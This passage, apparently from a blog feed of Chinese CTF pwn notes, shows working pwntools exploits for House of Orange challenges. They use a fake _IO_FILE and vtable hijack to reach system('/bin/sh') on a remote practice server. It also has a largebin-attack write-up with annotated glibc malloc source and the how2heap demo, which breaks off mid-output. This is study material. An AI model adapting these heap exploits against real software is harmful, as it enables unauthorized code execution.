class="comment">#fake_chunk=p64(0)+p64(0x61)+p64(io_list_all-0x10)*2</span></span><br><span class="line">    payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x2f0</span></span><br><span class="line">    payload+=file_data</span><br><span class="line">    <span class="comment">## step 3 overwrite unsorted-&gt;bk</span></span><br><span class="line">    write_one(<span class="number">0x2f0</span>,payload)</span><br><span class="line">    <span class="comment">#pdbg.bp(0x4007d2)</span></span><br><span class="line">    <span class="comment">## step 4 malloc again, trigger unsorted attack and _IO_flush_all_lokcp</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;size: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.interactive() <span class="comment">#get the shell</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">   pwn()</span><br></pre></td></tr></table></figure><h3 id="houseoforange-hitcon-2016"><a href="#houseoforange-hitcon-2016" class="headerlink" title="houseoforange_hitcon_2016"></a>houseoforange_hitcon_2016</h3><p>任意堆溢出漏洞，edit可编辑size大小</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn_debug <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># sh = process(&quot;./pwn&quot;)</span></span><br><span class="line">sh = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">29427</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&quot;/glibc/x64/2.23/lib/libc-2.23.so&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;../libc-2.23.so&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">cho = <span class="string">&#x27;Your choice : &#x27;</span>      </span><br><span class="line">siz = <span class="string">&#x27;Length of name :&#x27;</span>    </span><br><span class="line">con = <span class="string">&#x27;Name :&#x27;</span>        </span><br><span class="line">pri = <span class="string">&#x27;Price of Orange:&#x27;</span></span><br><span class="line">col = <span class="string">&#x27;Color of Orange:&#x27;</span></span><br><span class="line">ind = <span class="string">&#x27;&#x27;</span>     </span><br><span class="line">edi = <span class="string">&#x27;&#x27;</span>        </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size, content, price, color, c=<span class="string">&#x27;1&#x27;</span></span>):</span></span><br><span class="line">    sh.sendlineafter(cho, c)</span><br><span class="line">    sh.sendlineafter(siz, <span class="built_in">str</span>(size))</span><br><span class="line">    sh.sendafter(con, content)</span><br><span class="line">    sh.sendlineafter(pri, <span class="built_in">str</span>(price))</span><br><span class="line">    sh.sendlineafter(col, <span class="built_in">str</span>(color))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">c=<span class="string">&#x27;2&#x27;</span></span>):</span></span><br><span class="line">    sh.sendlineafter(cho, c)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">length, content, price, color, c=<span class="string">&#x27;3&#x27;</span></span>):</span></span><br><span class="line">    sh.sendlineafter(cho, c)</span><br><span class="line">    sh.sendlineafter(siz, <span class="built_in">str</span>(length))</span><br><span class="line">    sh.sendafter(<span class="string">&#x27;Name:&#x27;</span>, content)</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;Price of Orange: &#x27;</span>, <span class="built_in">str</span>(price))</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;Color of Orange: &quot;</span>, <span class="built_in">str</span>(color))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x68</span>, <span class="number">0x10</span>, <span class="number">0xddaa</span>)  </span><br><span class="line">payload = <span class="string">&#x27;p&#x27;</span>*<span class="number">0x88</span>+p64(<span class="number">0x21</span>)+p32(<span class="number">0x10</span>)+p32(<span class="number">0xddaa</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0xf31</span>)</span><br><span class="line">edit(<span class="number">0xb1</span>, payload, <span class="number">0x10</span>, <span class="number">0xddaa</span>)        <span class="comment"># 劫持top chunk的size为0xf31</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x1000</span>, <span class="string">&#x27;b&#x27;</span>*<span class="number">0x10</span>, <span class="number">0x1111</span>, <span class="number">0xddaa</span>)    <span class="comment"># top chunk掉入unsortbin</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x400</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>, <span class="number">0x1111</span>, <span class="number">0xddaa</span>)</span><br><span class="line">show()</span><br><span class="line">heap_ptr = u64(sh.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = heap_ptr-<span class="number">1640</span>-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x10</span></span><br><span class="line">success(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">io_list_all = libc_base + libc.sym[<span class="string">&quot;_IO_list_all&quot;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh_addr = libc_base+<span class="built_in">next</span>(libc.search(<span class="string">&quot;/bin/sh&quot;</span>))</span><br><span class="line">IO_file_jumps_offset = libc.sym[<span class="string">&#x27;_IO_file_jumps&#x27;</span>]</span><br><span class="line">IO_str_underflow_offset = libc.sym[<span class="string">&#x27;_IO_str_underflow&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ref_offset <span class="keyword">in</span> libc.search(p64(IO_str_underflow_offset)):</span><br><span class="line">    possible_IO_str_jumps_offset = ref_offset - <span class="number">0x20</span></span><br><span class="line">    <span class="keyword">if</span> possible_IO_str_jumps_offset &gt; IO_file_jumps_offset:</span><br><span class="line">        success(<span class="built_in">hex</span>(possible_IO_str_jumps_offset))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">io_str_jumps = libc_base+possible_IO_str_jumps_offset   <span class="comment"># 0x3c34a0</span></span><br><span class="line">success(<span class="built_in">hex</span>(io_str_jumps))</span><br><span class="line"></span><br><span class="line">fake_file = p64(<span class="number">0</span>) + p64(<span class="number">0x60</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(io_list_all - <span class="number">0x10</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)<span class="comment"># _IO_write_base &lt; _IO_write_ptr</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(binsh_addr)<span class="comment"># _IO_buf_base = binsh_addr</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xC0</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">fake_file += p64(io_str_jumps - <span class="number">0x8</span>)<span class="comment"># vtable</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)</span><br><span class="line">fake_file += p64(system)</span><br><span class="line"></span><br><span class="line">file_data = <span class="built_in">str</span>(fake_file) + p64(system) * <span class="number">2</span></span><br><span class="line">payload = <span class="string">&#x27;x&#x27;</span> * (<span class="number">0x540</span> - <span class="number">0x140</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + \</span><br><span class="line">    p32(<span class="number">0x666</span>) + p32(<span class="number">0xddaa</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += file_data</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0x800</span>, payload, <span class="number">666</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> IO_FILE利用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>largebin attack 学习(例子未完成)</title>
      <link href="2021/07/25/largebin-attack/"/>
      <url>2021/07/25/largebin-attack/</url>
      
        <content type="html"><![CDATA[<h2 id="largebin-attack"><a href="#largebin-attack" class="headerlink" title="largebin attack"></a>largebin attack</h2><blockquote><p>在64位下，申请大于0x400chunk最终会进入largebin。<br>Large bins 一共包括63 个bin，每个bin 中的chunk 大小不是一个固定公差的等差数列，而是分成6 组bin，每组bin 是一个固定公差的等差数列，每组的bin 数量依次为32、16、8、4、2、1，公差依次为64B、512B、4096B、32768B、262144B 等。</p></blockquote><p>根据ctfwiki和师傅们的总结：</p><ul><li>按照大小从大到小排序</li><li>若大小相同,按照free时间排序</li><li>若干个大小相同的堆块,只有首堆块的fd_nextsize和bk_nextsize会指向其他堆块,后面的堆块的fd_nextsize和bk_nextsize均为0</li><li>size最大的chunk的bk_nextsize指向最小的chunk; size最小的chunk的fd_nextsize指向最大的chunk</li></ul><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>进入largebin的相关代码如下(_int_malloc)<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (;; )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">int</span> iters = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">// 先判断下是不是unsorted本身，不是就进入while</span></span><br><span class="line">      <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="comment">// victim = 将要入largebin的块</span></span><br><span class="line">          bck = victim-&gt;bk; </span><br><span class="line">        <span class="comment">// 检测size</span></span><br><span class="line">          <span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">            malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                             chunk2mem (victim), av);</span><br><span class="line">          size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/*</span></span><br><span class="line"><span class="comment">             If a small request, try to use last remainder if it is the</span></span><br><span class="line"><span class="comment">             only chunk in unsorted bin.  This helps promote locality for</span></span><br><span class="line"><span class="comment">             runs of consecutive small requests. This is the only</span></span><br><span class="line"><span class="comment">             exception to best-fit, and applies only when there is</span></span><br><span class="line"><span class="comment">             no exact fit for a small chunk.</span></span><br><span class="line"><span class="comment">           */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;</span><br><span class="line">              bck == unsorted_chunks (av) &amp;&amp;</span><br><span class="line">              victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">              (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="comment">/* split and reattach remainder */</span></span><br><span class="line">              remainder_size = size - nb;</span><br><span class="line">              remainder = chunk_at_offset (victim, nb);</span><br><span class="line">              unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;</span><br><span class="line">              av-&gt;last_remainder = remainder;</span><br><span class="line">              remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);</span><br><span class="line">              <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                &#123;</span><br><span class="line">                  remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                  remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">              set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                        (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">              set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">              set_foot (remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* remove from unsorted list */</span></span><br><span class="line">        <span class="comment">// 这个地方的bck是之前unsortedbin中的第二块，将bin[1]的bk赋值为第二块，开始进行脱链操作</span></span><br><span class="line">          unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">        <span class="comment">// 将第二块的fd赋值为bin[1](ub)</span></span><br><span class="line">          bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (size == nb)</span><br><span class="line">            &#123;</span><br><span class="line">              set_inuse_bit_at_offset (victim, size);</span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* place chunk in bin */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (size))</span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = smallbin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line">            &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">            <span class="comment">// 获得对应largebin的index</span></span><br><span class="line">              victim_index = largebin_index (size);</span><br><span class="line">            <span class="comment">// bck为bin[对应的index]，记为bin1</span></span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">            <span class="comment">// fwd = bin1 -&gt; fd ，即整个链条的尾部</span></span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">            <span class="comment">// largebin里有就进if</span></span><br><span class="line">              <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">                  size |= PREV_INUSE;</span><br><span class="line">                  <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">                  assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                <span class="comment">// 如果该chunk的size小于bin1 -&gt; bk -&gt; size， 即小于最前面的那个，就进if</span></span><br><span class="line">                  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (bck-&gt;bk-&gt;size))</span><br><span class="line">                    &#123;</span><br><span class="line">                    <span class="comment">// fwd = bin1</span></span><br><span class="line">                      fwd = bck;</span><br><span class="line">                    <span class="comment">// bck = bin1 -&gt; bk (第一个chunk)</span></span><br><span class="line">                      bck = bck-&gt;bk;</span><br><span class="line"><span class="comment">// 调整nextsize: fd_nextsize = bin1 -&gt; fd，即指向最后一个chunk</span></span><br><span class="line">                      victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">              <span class="comment">// 调整nextsize: bk_nextsize = bin1 -&gt; fd -&gt; bk_nextsize，即指向第一个chunk（该chunk插入后将会成为第一个chunk）</span></span><br><span class="line">                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                    <span class="comment">// 调整相邻两块的nextsize，第一块chunk的fd_nextsize将成为victim，最后一块的bk_nextsize将会成为victim（此时nextsize已完成链表的插入操作）</span></span><br><span class="line">                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                    &#125;</span><br><span class="line">                <span class="comment">// 该chunk大于前面那个chunk的size就进else</span></span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                      assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                    <span class="comment">// 直到该size大于等于链表中的某个size（从尾部开始遍历，即size最大的地方向小的地方遍历）</span></span><br><span class="line">                      <span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size &lt; fwd-&gt;size)</span><br><span class="line">                        &#123;</span><br><span class="line">                          fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">                          assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                        &#125;</span><br><span class="line"><span class="comment">// 判断是否和size相等，相等的话就链到前面</span></span><br><span class="line">                      <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size == (<span class="keyword">unsigned</span> <span class="keyword">long</span>) fwd-&gt;size)</span><br><span class="line">                        <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                        fwd = fwd-&gt;fd;</span><br><span class="line">                    <span class="comment">// 不相等</span></span><br><span class="line">                      <span class="keyword">else</span></span><br><span class="line">                        &#123;</span><br><span class="line">                        <span class="comment">// 调整nextsize，这个时候是以fwd为索引，因为进入了while循环，不确定fwd是否发生了改变，bck索引不再准确</span></span><br><span class="line">                          victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                        <span class="comment">// 调整相邻chunk的nextsize</span></span><br><span class="line">                          fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                        &#125;</span><br><span class="line">                      bck = fwd-&gt;bk;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                <span class="comment">// 对应的情况就是largebin中只有这一个，也就是该chunk是第一个进入largebin的块，那么其两个nextsize位都是其本身</span></span><br><span class="line">                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 最后都进行链表的插入</span></span><br><span class="line">          mark_bin (av, victim_index);</span><br><span class="line">          victim-&gt;bk = bck;</span><br><span class="line">          victim-&gt;fd = fwd;</span><br><span class="line">          fwd-&gt;bk = victim;</span><br><span class="line">          bck-&gt;fd = victim;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_ITERS       10000</span></span><br><span class="line">          <span class="keyword">if</span> (++iters &gt;= MAX_ITERS)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></p><h3 id="图示"><a href="#图示" class="headerlink" title="图示"></a>图示</h3><p>网络上有一张比较经典的largebin的图示，我再稍微补充一下index64的fd和bk，大概长这样</p><p><img src="https://i.loli.net/2021/07/26/FVNtTrI52nCuzpj.png" alt="s" style="zoom:50%;" /></p><h3 id="how2heap"><a href="#how2heap" class="headerlink" title="how2heap"></a>how2heap</h3><p>用libc-2.23.so</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This technique only works with disabled tcache-option for glibc, see glibc_build.sh for build instructions.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This file demonstrates large bin attack by writing a large unsigned long value into stack\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;In practice, large bin attack is generally prepared for further attacks, such as rewriting the &quot;</span></span><br><span class="line">           <span class="string">&quot;global variable global_max_fast in libc for further fastbin attack\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var1 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Let&#x27;s first look at the targets we want to rewrite on stack:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var1 (%p): %ld\n&quot;</span>, &amp;stack_var1, stack_var1);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var2 (%p): %ld\n\n&quot;</span>, &amp;stack_var2, stack_var2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x320</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we allocate the first large chunk on the heap at: %p\n&quot;</span>, p1 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with&quot;</span></span><br><span class="line">           <span class="string">&quot; the first large chunk during the free()\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Then, we allocate the second large chunk on the heap at: %p\n&quot;</span>, p2 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with&quot;</span></span><br><span class="line">           <span class="string">&quot; the second large chunk during the free()\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Finally, we allocate the third large chunk on the heap at: %p\n&quot;</span>, p3 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And allocate another fastbin chunk in order to avoid consolidating the top chunk with&quot;</span></span><br><span class="line">           <span class="string">&quot; the third large chunk during the free()\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;We free the first and second large chunks now and they will be inserted in the unsorted bin:&quot;</span></span><br><span class="line">           <span class="string">&quot; [ %p &lt;--&gt; %p ]\n\n&quot;</span>, (<span class="keyword">void</span> *)(p2 - <span class="number">2</span>), (<span class="keyword">void</span> *)(p2[<span class="number">0</span>]));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the&quot;</span></span><br><span class="line">            <span class="string">&quot; freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation&quot;</span></span><br><span class="line">            <span class="string">&quot;, and reinsert the remaining of the freed first large chunk into the unsorted bin:&quot;</span></span><br><span class="line">            <span class="string">&quot; [ %p ]\n\n&quot;</span>, (<span class="keyword">void</span> *)((<span class="keyword">char</span> *)p1 + <span class="number">0x90</span>));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(p3);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we free the third large chunk and it will be inserted in the unsorted bin:&quot;</span></span><br><span class="line">           <span class="string">&quot; [ %p &lt;--&gt; %p ]\n\n&quot;</span>, (<span class="keyword">void</span> *)(p3 - <span class="number">2</span>), (<span class="keyword">void</span> *)(p3[<span class="number">0</span>]));</span><br><span class="line"></span><br><span class="line">    <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now emulating a vulnerability that can overwrite the freed second large chunk&#x27;s \&quot;size\&quot;&quot;</span></span><br><span class="line">            <span class="string">&quot; as well as its \&quot;bk\&quot; and \&quot;bk_nextsize\&quot; pointers\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk&quot;</span></span><br><span class="line">            <span class="string">&quot; at the head of the large bin freelist. To overwrite the stack variables, we set \&quot;bk\&quot; to 16 bytes before stack_var1 and&quot;</span></span><br><span class="line">            <span class="string">&quot; \&quot;bk_nextsize\&quot; to 32 bytes before stack_var2\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    p2[<span class="number">-1</span>] = <span class="number">0x3f1</span>;</span><br><span class="line">    p2[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    p2[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">    p2[<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var1 - <span class="number">2</span>);</span><br><span class="line">    p2[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var2 - <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Let&#x27;s malloc again, so the freed third large chunk being inserted into the large bin freelist.&quot;</span></span><br><span class="line">            <span class="string">&quot; During this time, targets should have already been rewritten:\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var1 (%p): %p\n&quot;</span>, &amp;stack_var1, (<span class="keyword">void</span> *)stack_var1);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var2 (%p): %p\n&quot;</span>, &amp;stack_var2, (<span class="keyword">void</span> *)stack_var2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">This technique only works with disabled tcache-option <span class="keyword">for</span> glibc, see glibc_build.sh <span class="keyword">for</span> build instructions.</span><br><span class="line">This file demonstrates large bin attack by writing a large unsigned long value into stack</span><br><span class="line">In practice, large bin attack is generally prepared <span class="keyword">for</span> further attacks, such as rewriting the global variable global_max_fast <span class="keyword">in</span> libc <span class="keyword">for</span> further fastbin attack</span><br><span class="line"></span><br><span class="line">Let<span class="string">&#x27;s first look at the targets we want to rewrite on stack:</span></span><br><span class="line"><span class="string">stack_var1 (0x7ffe4c957580): 0</span></span><br><span class="line"><span class="string">stack_var2 (0x7ffe4c957588): 0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Now, we allocate the first large chunk on the heap at: 0x55616307d000</span></span><br><span class="line"><span class="string">And allocate another fastbin chunk in order to avoid consolidating the next large chunk with the first large chunk during the free()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Then, we allocate the second large chunk on the heap at: 0x55616307d360</span></span><br><span class="line"><span class="string">And allocate another fastbin chunk in order to avoid consolidating the next large chunk with the second large chunk during the free()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Finally, we allocate the third large chunk on the heap at: 0x55616307d7a0</span></span><br><span class="line"><span class="string">And allocate another fastbin chunk in order to avoid consolidating the top chunk with the third large chunk during the free()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">We free the first and second large chunks now and they will be inserted in the unsorted bin: [ 0x55616307d360 &lt;--&gt; 0x55616307d000 ]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the freed second large chunk into 